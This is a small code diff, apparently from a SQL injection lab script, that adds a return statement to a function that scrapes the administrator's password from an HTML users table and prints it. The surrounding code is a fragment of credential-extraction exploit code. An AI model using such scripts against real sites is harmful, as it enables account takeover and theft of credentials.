@@ -16,6 +16,7 @@ def sqli_user_table(url):
         parse= BeautifulSoup(res,'html.parser')
         admin_password = parse.body.find(text='administrator').parent.findNext('td').contents[0]
         print(f"the admin password is {admin_password}")
+        return True
     else:
         return False
     
